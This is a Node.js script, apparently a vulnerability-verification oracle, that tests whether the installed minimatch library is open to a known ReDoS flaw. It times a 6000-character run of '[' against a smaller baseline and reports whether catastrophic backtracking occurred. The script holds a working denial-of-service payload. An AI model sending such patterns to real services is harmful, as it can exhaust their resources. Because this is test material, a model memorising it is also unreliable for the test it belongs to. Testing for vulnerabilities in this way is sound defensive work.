'use strict';
const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');

function finish(obj) {
  console.log('ORACLE_RESULT ' + JSON.stringify(obj));
}

let minimatch;
try {
  minimatch = require('minimatch');
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
  process.exit(0);
}

const marker = 'oracle-marker-' + Math.random().toString(36).slice(2) + '-' + Date.now();
const baseDir = path.join(os.tmpdir(), marker);

try {
  fs.mkdirSync(baseDir, { recursive: true });
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'setup failed creating tmp dir: ' + String(e && e.message) });
  process.exit(0);
}

let operation_completed = false;

try {
  // Benign operation: prove the API works with a simple extglob pattern.
  const benignSubject = 'aaaaaaaaaa';
  const benignPattern = '*(a)';
  const benignResult = minimatch(benignSubject, benignPattern);

  if (benignResult !== true) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign operation did not return true as expected: ' + JSON.stringify(benignResult) });
    process.exit(0);
  }

  operation_completed = true;

  // Known ReDoS reproducer for minimatch <=3.0.4 (GHSA-f8q6-p94x-37v3):
  // a long run of '[' characters. The vulnerable braceExpand/regex path
  // exhibits catastrophic backtracking proportional to input length;
  // the fixed version handles this near-linearly.
  //
  // Choose a bounded size that still finishes within a few seconds even
  // on the vulnerable version, but is large enough to show a clear
  // superlinear blowup versus a small baseline of the same shape.

  function buildMaliciousPattern(n) {
    return '['.repeat(n);
  }

  // Baseline: small size, same shape, used as a timing reference.
  const baselineN = 500;
  const baselinePattern = buildMaliciousPattern(baselineN);
  const baselineSubject = 'a'.repeat(baselineN);

  const baselineStart = process.hrtime.bigint();
  let baselineThrew = false;
  try {
    minimatch(baselineSubject, baselinePattern);
  } catch (e) {
    baselineThrew = true;
  }
  const baselineEnd = process.hrtime.bigint();
  const baselineMs = Number(baselineEnd - baselineStart) / 1e6;

  // Malicious: larger size of the same shape, chosen to stay within a few
  // seconds even on the vulnerable engine, yet show clear disproportionate
  // slowdown relative to the baseline scaling.
  const N = 6000;
  const maliciousPattern = buildMaliciousPattern(N);
  const maliciousSubject = 'a'.repeat(N);

  const start = process.hrtime.bigint();
  let maliciousResult;
  let threw = false;
  let errMsg = '';
  try {
    maliciousResult = minimatch(maliciousSubject, maliciousPattern);
  } catch (e) {
    threw = true;
    errMsg = String(e && e.message);
  }
  const end = process.hrtime.bigint();
  const elapsedMs = Number(end - start) / 1e6;

  // Input size grew by 12x (6000 / 500). A roughly linear-time
  // implementation should scale close to linearly (allowing generous
  // slack for noise), while a catastrophically backtracking
  // implementation should scale vastly worse than that.
  const absoluteThresholdMs = 1000; // vulnerable case should clearly exceed this
  const relativeSlowdownFactor = 40; // vulnerable call should be vastly slower than linear scaling would predict
  const safeBaselineMs = Math.max(baselineMs, 0.05);

  let exploit_succeeded;
  let evidence;

  if (!threw && elapsedMs > absoluteThresholdMs && elapsedMs > safeBaselineMs * relativeSlowdownFactor) {
    exploit_succeeded = true;
    evidence = 'Malicious minimatch() call with pattern length ' + N + ' took ' + elapsedMs.toFixed(2) + 'ms vs baseline (length ' + baselineN + ') ' + baselineMs.toFixed(3) + 'ms (threshold ' + absoluteThresholdMs + 'ms, factor ' + relativeSlowdownFactor + 'x), indicating catastrophic backtracking (ReDoS). result=' + JSON.stringify(maliciousResult);
  } else if (threw) {
    exploit_succeeded = false;
    evidence = 'Malicious pattern call threw an exception after benign op succeeded; treated as blocked. elapsedMs=' + elapsedMs.toFixed(2) + ' err=' + errMsg;
  } else {
    exploit_succeeded = false;
    evidence = 'Malicious minimatch() call completed within expected bounds (' + elapsedMs.toFixed(2) + 'ms, baseline ' + baselineMs.toFixed(3) + 'ms); no disproportionate slowdown observed. result=' + JSON.stringify(maliciousResult);
  }

  finish({ operation_completed, exploit_succeeded, evidence });
} catch (e) {
  finish({ operation_completed: operation_completed, exploit_succeeded: false, evidence: 'unexpected exception during exploit phase: ' + String(e && e.message) });
} finally {
  try {
    fs.rmSync(baseDir, { recursive: true, force: true });
  } catch (_) {
    // ignore cleanup errors
  }
}
